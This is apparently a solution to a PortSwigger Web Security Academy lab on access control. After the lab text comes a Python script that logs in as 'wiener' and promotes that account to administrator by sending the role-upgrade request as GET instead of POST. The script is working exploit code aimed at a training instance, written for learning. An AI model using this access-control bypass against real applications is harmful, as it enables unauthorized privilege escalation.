# Method-based access control can be circumvented

> This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.
> To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.

```python
import requests
import sys

# Configuration
BASE_URL = "https://0a7a00e60314fb23818c70a500da0084.web-security-academy.net/"

def promote_wiener(url, session):
    # Construct the exploit URL using GET method
    # The vulnerability allows us to use GET parameters instead of POST body
    # to bypass the specific filter on POST requests.
    exploit_url = f"{url.rstrip('/')}/admin-roles"
    params = {
        "username": "wiener",
        "action": "upgrade"
    }
    
    print(f"[*] Attempting Method Bypass (GET) on: {exploit_url}")
    print(f"[*] Payload: {params}")
    
    # Send GET request (Access Control is missing for GET)
    response = session.get(exploit_url, params=params)
    
    if response.status_code == 200:
        print("[+] Request sent successfully.")
        
        # Verify if promotion worked by checking for admin panel or banner
        verify_resp = session.get(f"{url.rstrip('/')}/admin")
        if verify_resp.status_code == 200:
             print("[+] SUCCESS: Wiener is now an Administrator.")
        else:
             print("[-] Promotion might have failed. Admin panel not accessible.")
    else:
        print(f"[-] Failed. Status Code: {response.status_code}")

def login_and_exploit(url):
    session = requests.Session()
    login_url = f"{url.rstrip('/')}/login"
    
    # Login credentials
    creds = {
        "username": "wiener",
        "password": "peter"
    }
    
    print(f"[*] Logging in as 'wiener'...")
    resp = session.post(login_url, data=creds)
    
    if "Log out" in resp.text:
        print("[+] Login Successful.")
        promote_wiener(url, session)
    else:
        print("[-] Login Failed.")

if __name__ == "__main__":
    login_and_exploit(BASE_URL)
```